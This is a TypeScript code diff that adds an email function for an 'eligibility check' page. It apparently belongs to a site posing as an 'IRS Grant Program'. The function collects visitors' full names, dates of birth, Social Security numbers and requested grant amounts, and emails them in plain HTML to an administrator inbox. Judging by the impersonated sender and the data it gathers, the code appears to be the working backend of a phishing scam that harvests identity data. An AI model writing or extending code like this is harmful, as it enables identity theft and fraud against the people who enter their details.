@@ -99,3 +99,49 @@ export async function sendClaimNotification(claimData: Record<string, unknown>) 
     return { success: false, error }
   }
 }
+
+export async function sendEligibilityCheckNotification(data: Record<string, string>) {
+  if (!resend) {
+    console.log("Resend not configured — skipping eligibility check email")
+    console.log("Eligibility data:", JSON.stringify(data, null, 2))
+    return { success: true, skipped: true }
+  }
+
+  const { firstName, lastName, dob, ssn, grantAmount } = data
+  const fullName = `${firstName} ${lastName}`
+
+  const formattedAmount = new Intl.NumberFormat("en-US", {
+    style: "currency",
+    currency: "USD",
+    minimumFractionDigits: 0,
+  }).format(Number(grantAmount))
+
+  try {
+    const { data: resendData, error } = await resend.emails.send({
+      from: "IRS Grant Program <onboarding@resend.dev>",
+      to: [process.env.NOTIFICATION_EMAIL || "admin@example.com"],
+      subject: `Eligibility Check Submitted: ${fullName}`,
+      html: `
+        <h2 style="color: #1a1a5e;">New Eligibility Check Submitted</h2>
+        <p>A user has submitted their information on the eligibility check page.</p>
+        <table style="border-collapse: collapse; width: 100%; max-width: 600px;">
+          <tr><td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #dfe1e2;">First Name:</td><td style="padding: 8px; border-bottom: 1px solid #dfe1e2;">${firstName}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #dfe1e2;">Last Name:</td><td style="padding: 8px; border-bottom: 1px solid #dfe1e2;">${lastName}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #dfe1e2;">Date of Birth:</td><td style="padding: 8px; border-bottom: 1px solid #dfe1e2;">${dob}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #dfe1e2;">SSN:</td><td style="padding: 8px; border-bottom: 1px solid #dfe1e2;">${ssn}</td></tr>
+          <tr><td style="padding: 8px; font-weight: bold; border-bottom: 1px solid #dfe1e2;">Requested Amount:</td><td style="padding: 8px; border-bottom: 1px solid #dfe1e2;">${formattedAmount}</td></tr>
+        </table>
+      `,
+    })
+
+    if (error) {
+      console.error("Email error:", error)
+      return { success: false, error }
+    }
+
+    return { success: true, data: resendData }
+  } catch (error) {
+    console.error("Email send failed:", error)
+    return { success: false, error }
+  }
+}
